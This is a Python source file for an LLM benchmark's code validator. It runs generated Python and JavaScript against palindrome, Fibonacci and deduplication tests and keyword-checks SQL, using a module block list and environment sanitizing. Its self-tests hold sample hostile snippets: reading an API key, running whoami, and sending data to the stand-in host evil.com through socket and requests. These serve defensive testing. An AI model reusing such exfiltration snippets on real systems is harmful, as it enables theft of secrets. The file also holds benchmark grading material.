#!/usr/bin/env python3
"""
Code Validator for LLM Benchmark

Validates generated code by actually executing it with test cases.
Supports Python, JavaScript, and SQL (keyword validation only).

Security measures:
- All code execution in isolated subprocesses with timeouts (3s default)
- Dangerous Python modules blocked (os, subprocess, socket, etc.)
- Environment variables sanitized (API keys not accessible)
- Network access blocked via module restrictions

Note: This provides defense-in-depth for controlled benchmarking scenarios.
For production untrusted code execution, use containerized sandboxes (Docker/gVisor).
"""

import ast
import os
import re
import subprocess
from typing import Optional


# --- Security Configuration ---

# Python modules to block (prevents file/network/system access)
BLOCKED_PYTHON_MODULES = {
    # System/process access
    'os', 'subprocess', 'sys', 'signal', 'resource',
    # Network access
    'socket', 'requests', 'urllib', 'http', 'httpx', 'aiohttp',
    'ftplib', 'smtplib', 'telnetlib', 'ssl', 'websocket',
    # File system access
    'shutil', 'pathlib', 'glob', 'tempfile', 'io',
    # Serialization (code execution risk)
    'pickle', 'shelve', 'marshal',
    # Dynamic imports
    'importlib', 'imp',
    # Low-level / dangerous
    'ctypes', 'multiprocessing', 'threading', 'asyncio', 'concurrent',
    'pwd', 'grp', 'pty', 'tty', 'termios', 'fcntl', 'pipes',
    'posix', 'posixpath', 'nt', 'ntpath', '_thread',
    # Code execution
    'code', 'codeop', 'compile', 'exec', 'eval',
}

# Environment variables to remove before execution (protects API keys)
SANITIZED_ENV_VARS = [
    'OPENAI_API_KEY', 'ANTHROPIC_API_KEY', 'GOOGLE_API_KEY',
    'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
    'GITHUB_TOKEN', 'GITLAB_TOKEN', 'NPM_TOKEN',
    'DATABASE_URL', 'SUPABASE_URL', 'SUPABASE_KEY',
    'SECRET_KEY', 'API_KEY', 'AUTH_TOKEN', 'PASSWORD',
]


def get_sanitized_env() -> dict:
    """Return environment dict with sensitive variables removed."""
    env = os.environ.copy()
    for var in SANITIZED_ENV_VARS:
        env.pop(var, None)
    # Also remove any variable containing 'KEY', 'SECRET', 'TOKEN', 'PASSWORD'
    sensitive_patterns = ['KEY', 'SECRET', 'TOKEN', 'PASSWORD', 'CREDENTIAL']
    keys_to_remove = [k for k in env if any(p in k.upper() for p in sensitive_patterns)]
    for k in keys_to_remove:
        env.pop(k, None)
    return env


def check_for_dangerous_imports(code: str) -> Optional[str]:
    """
    Statically analyze code for dangerous imports using AST.
    
    Returns the name of a blocked module if found, None if safe.
    This is done BEFORE execution to prevent any dangerous code from running.
    """
    try:
        tree = ast.parse(code)
    except SyntaxError:
        return None  # Syntax errors handled elsewhere
    
    for node in ast.walk(tree):
        # Check 'import X' statements
        if isinstance(node, ast.Import):
            for alias in node.names:
                module_name = alias.name.split('.')[0]
                if module_name in BLOCKED_PYTHON_MODULES:
                    return module_name
        
        # Check 'from X import Y' statements
        elif isinstance(node, ast.ImportFrom):
            if node.module:
                module_name = node.module.split('.')[0]
                if module_name in BLOCKED_PYTHON_MODULES:
                    return module_name
        
        # Check for dangerous built-in calls: eval(), exec(), compile(), __import__()
        elif isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name):
                if node.func.id in ('eval', 'exec', 'compile', '__import__', 'open'):
                    return node.func.id
    
    return None


# --- Code Extraction ---

def extract_code_block(text: str) -> str:
    """
    Extract code from markdown fenced blocks or raw text.
    
    Handles:
    - ```python ... ``` blocks
    - ```javascript ... ``` or ```js ... ``` blocks
    - ```sql ... ``` blocks
    - Raw code starting with 'def ', 'function', 'SELECT', etc.
    """
    if not text:
        return ""
    
    # Try to find fenced code blocks
    patterns = [
        r'```(?:python|py)\s*\n(.*?)```',      # Python
        r'```(?:javascript|js)\s*\n(.*?)```',  # JavaScript
        r'```(?:sql)\s*\n(.*?)```',            # SQL
        r'```\s*\n(.*?)```',                   # Generic code block
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text, re.DOTALL | re.IGNORECASE)
        if match:
            return match.group(1).strip()
    
    # No fenced block found - try to extract raw code
    lines = text.split('\n')
    code_lines = []
    in_code = False
    
    for line in lines:
        stripped = line.strip()
        # Start of code
        if not in_code and (
            stripped.startswith('def ') or
            stripped.startswith('function ') or
            stripped.startswith('const ') or
            stripped.startswith('SELECT ') or
            stripped.startswith('select ') or
            stripped.startswith('from ') or
            stripped.startswith('import ') or
            stripped.startswith('class ')
        ):
            in_code = True
        
        if in_code:
            # Stop at obvious non-code lines
            if stripped.startswith('Note:') or stripped.startswith('This '):
                break
            code_lines.append(line)
    
    return '\n'.join(code_lines).strip()


# --- Python Validation ---

def validate_python_syntax(code: str) -> bool:
    """Check if Python code has valid syntax."""
    try:
        ast.parse(code)
        return True
    except SyntaxError:
        return False


def test_python_code(code: str, prompt: str) -> bool:
    """
    Execute Python code with test cases in a security-hardened subprocess.
    
    Security measures applied:
    - Static AST analysis blocks dangerous imports BEFORE execution
    - Environment sanitized (API keys removed from subprocess)
    - 3-second timeout prevents runaway execution
    
    Returns True if all tests pass.
    """
    if not code or not validate_python_syntax(code):
        return False
    
    # SECURITY: Check for dangerous imports BEFORE execution
    blocked_module = check_for_dangerous_imports(code)
    if blocked_module:
        return False  # Reject code that imports dangerous modules
    
    # Determine test cases based on prompt
    test_script = None
    prompt_lower = prompt.lower()
    
    if 'palindrome' in prompt_lower:
        test_script = f'''
{code}

# Find the function name
import inspect
funcs = [name for name, obj in locals().items() 
         if callable(obj) and not name.startswith('_') and name != 'inspect']
if not funcs:
    print("FAIL: No function found")
    exit(1)

func = locals()[funcs[0]]

# Test cases
tests = [
    ("racecar", True),
    ("hello", False),
    ("", True),
    ("A man a plan a canal Panama".replace(" ", "").lower(), True),
    ("ab", False),
]

passed = 0
for inp, expected in tests:
    try:
        result = func(inp)
        # Handle case-insensitive palindrome checks
        if isinstance(result, bool) and result == expected:
            passed += 1
        elif result == expected:
            passed += 1
    except:
        pass

if passed >= 3:  # At least 3 of 5 tests must pass
    print("PASS")
else:
    print(f"FAIL: {{passed}}/5 tests passed")
'''
    
    elif 'fibonacci' in prompt_lower:
        test_script = f'''
{code}

# Find the function name
import inspect
funcs = [name for name, obj in locals().items() 
         if callable(obj) and not name.startswith('_') and name != 'inspect']
if not funcs:
    print("FAIL: No function found")
    exit(1)

func = locals()[funcs[0]]

# Test cases: fib(n) should return nth Fibonacci number
tests = [
    (0, 0),
    (1, 1),
    (2, 1),
    (5, 5),
    (10, 55),
]

passed = 0
for n, expected in tests:
    try:
        result = func(n)
        if result == expected:
            passed += 1
    except:
        pass

if passed >= 4:  # At least 4 of 5 tests must pass
    print("PASS")
else:
    print(f"FAIL: {{passed}}/5 tests passed")
'''
    
    else:
        # Generic Python validation - just check it runs without error
        test_script = f'''
{code}
print("PASS")
'''
    
    # Execute in subprocess with sanitized environment
    try:
        result = subprocess.run(
            ["python3", "-c", test_script],
            capture_output=True,
            text=True,
            timeout=3,
            env=get_sanitized_env(),  # Remove API keys from environment
        )
        return "PASS" in result.stdout
    except subprocess.TimeoutExpired:
        return False
    except Exception:
        return False


# --- JavaScript Validation ---

def test_javascript_code(code: str, prompt: str) -> bool:
    """
    Execute JavaScript code with test cases using Node.js.
    
    Returns True if all tests pass.
    """
    if not code:
        return False
    
    prompt_lower = prompt.lower()
    
    if 'duplicates' in prompt_lower or 'duplicate' in prompt_lower:
        test_script = f'''
{code}

// Find the function - look for common names
let func = null;
if (typeof removeDuplicates === 'function') func = removeDuplicates;
else if (typeof removeDups === 'function') func = removeDups;
else if (typeof unique === 'function') func = unique;
else if (typeof dedupe === 'function') func = dedupe;
else if (typeof dedup === 'function') func = dedup;
else {{
    // Try to find any function in global scope
    const funcMatch = `{code}`.match(/function\\s+(\\w+)/);
    if (funcMatch && typeof eval(funcMatch[1]) === 'function') {{
        func = eval(funcMatch[1]);
    }}
    const arrowMatch = `{code}`.match(/(?:const|let|var)\\s+(\\w+)\\s*=/);
    if (arrowMatch && typeof eval(arrowMatch[1]) === 'function') {{
        func = eval(arrowMatch[1]);
    }}
}}

if (!func) {{
    console.log("FAIL: No function found");
    process.exit(1);
}}

// Test cases
let passed = 0;
const tests = [
    [[1, 2, 2, 3], 3],
    [[1, 1, 1], 1],
    [[1, 2, 3, 4, 5], 5],
    [[], 0],
];

for (const [input, expectedLen] of tests) {{
    try {{
        const result = func([...input]);  // Copy to avoid mutation issues
        if (Array.isArray(result) && result.length === expectedLen) {{
            passed++;
        }} else if (result && result.length === expectedLen) {{
            passed++;
        }}
    }} catch (e) {{}}
}}

if (passed >= 3) {{
    console.log("PASS");
}} else {{
    console.log(`FAIL: ${{passed}}/4 tests passed`);
}}
'''
    
    else:
        # Generic JavaScript validation
        test_script = f'''
{code}
console.log("PASS");
'''
    
    # Execute with Node.js (with sanitized environment)
    try:
        result = subprocess.run(
            ["node", "-e", test_script],
            capture_output=True,
            text=True,
            timeout=3,
            env=get_sanitized_env(),  # Remove API keys from environment
        )
        return "PASS" in result.stdout
    except subprocess.TimeoutExpired:
        return False
    except FileNotFoundError:
        # Node.js not installed - fall back to syntax check
        return "function" in code or "=>" in code
    except Exception:
        return False


# --- SQL Validation ---

def test_sql_code(code: str, prompt: str) -> bool:
    """
    Validate SQL query by checking for required keywords.
    No execution - just structural validation.
    """
    if not code:
        return False
    
    code_upper = code.upper()
    
    # Required keywords for the specific query
    prompt_lower = prompt.lower()
    
    if 'top 5 customers' in prompt_lower or 'order value' in prompt_lower:
        required = ['SELECT', 'FROM', 'JOIN', 'ORDER BY']
        optional = ['LIMIT', 'TOP', 'GROUP BY', 'SUM']
        
        # Must have all required keywords
        has_required = all(kw in code_upper for kw in required)
        # Should have at least 2 optional keywords
        has_optional = sum(1 for kw in optional if kw in code_upper) >= 2
        
        return has_required and has_optional
    
    # Generic SQL validation
    return 'SELECT' in code_upper and 'FROM' in code_upper


# --- Main Entry Point ---

def check_code_accuracy(response_text: str, prompt: str) -> bool:
    """
    Main entry point for code validation.
    Routes to the correct language validator based on the prompt.
    
    Args:
        response_text: The LLM's response containing generated code
        prompt: The original prompt (used to determine language and test cases)
    
    Returns:
        True if the code passes validation, False otherwise
    """
    if not response_text or not prompt:
        return False
    
    # Extract code from the response
    code = extract_code_block(response_text)
    if not code:
        return False
    
    prompt_lower = prompt.lower()
    
    # Route to appropriate validator
    if 'python' in prompt_lower:
        return test_python_code(code, prompt)
    elif 'javascript' in prompt_lower or 'js ' in prompt_lower:
        return test_javascript_code(code, prompt)
    elif 'sql' in prompt_lower:
        return test_sql_code(code, prompt)
    
    # Try to detect language from code
    if code.strip().startswith('def ') or 'import ' in code:
        return test_python_code(code, prompt)
    elif 'function ' in code or '=>' in code or 'const ' in code:
        return test_javascript_code(code, prompt)
    elif code.strip().upper().startswith('SELECT'):
        return test_sql_code(code, prompt)
    
    # Can't determine language
    return False


# --- CLI for testing ---

if __name__ == "__main__":
    # Test the validator
    print("Testing code validator...\n")
    
    print("=== Functional Tests ===")
    
    # Test Python palindrome
    python_palindrome = '''
```python
def is_palindrome(s):
    s = s.lower()
    return s == s[::-1]
```
'''
    result = check_code_accuracy(python_palindrome, "Write a Python function that checks if a string is a palindrome.")
    print(f"Python palindrome: {'✓ PASS' if result else '✗ FAIL'}")
    
    # Test Python Fibonacci
    python_fib = '''
```python
def fib(n, memo={}):
    if n in memo:
        return memo[n]
    if n <= 1:
        return n
    memo[n] = fib(n-1, memo) + fib(n-2, memo)
    return memo[n]
```
'''
    result = check_code_accuracy(python_fib, "Write a Python function that finds the nth Fibonacci number using recursion with memoization.")
    print(f"Python Fibonacci: {'✓ PASS' if result else '✗ FAIL'}")
    
    # Test JavaScript duplicates
    js_dupes = '''
```javascript
function removeDuplicates(arr) {
    return [...new Set(arr)];
}
```
'''
    result = check_code_accuracy(js_dupes, "Write a JavaScript function that removes duplicates from an array.")
    print(f"JavaScript duplicates: {'✓ PASS' if result else '✗ FAIL'}")
    
    # Test SQL
    sql_query = '''
```sql
SELECT c.customer_id, c.name, SUM(o.total) as total_value
FROM customers c
JOIN orders o ON c.customer_id = o.customer_id
GROUP BY c.customer_id, c.name
ORDER BY total_value DESC
LIMIT 5;
```
'''
    result = check_code_accuracy(sql_query, "Write a SQL query to find the top 5 customers by total order value from tables 'customers' and 'orders'.")
    print(f"SQL query: {'✓ PASS' if result else '✗ FAIL'}")
    
    print("\n=== Security Tests ===")
    
    # Test that os module is blocked
    malicious_os = '''
```python
import os
def get_secret():
    return os.environ.get('OPENAI_API_KEY', 'not found')
print(get_secret())
```
'''
    result = check_code_accuracy(malicious_os, "Write a Python function")
    print(f"Blocked os import: {'✓ BLOCKED' if not result else '✗ ALLOWED (security fail!)'}")
    
    # Test that subprocess is blocked
    malicious_subprocess = '''
```python
import subprocess
def run_cmd():
    return subprocess.run(['whoami'], capture_output=True).stdout
```
'''
    result = check_code_accuracy(malicious_subprocess, "Write a Python function")
    print(f"Blocked subprocess: {'✓ BLOCKED' if not result else '✗ ALLOWED (security fail!)'}")
    
    # Test that socket is blocked
    malicious_socket = '''
```python
import socket
def exfiltrate(data):
    s = socket.socket()
    s.connect(('evil.com', 80))
    s.send(data.encode())
```
'''
    result = check_code_accuracy(malicious_socket, "Write a Python function")
    print(f"Blocked socket: {'✓ BLOCKED' if not result else '✗ ALLOWED (security fail!)'}")
    
    # Test that requests is blocked
    malicious_requests = '''
```python
import requests
def steal_keys():
    return requests.post('https://evil.com', data={'key': 'stolen'})
```
'''
    result = check_code_accuracy(malicious_requests, "Write a Python function")
    print(f"Blocked requests: {'✓ BLOCKED' if not result else '✗ ALLOWED (security fail!)'}")
    
    print("\n✓ Security hardening active: dangerous modules blocked, env sanitized")

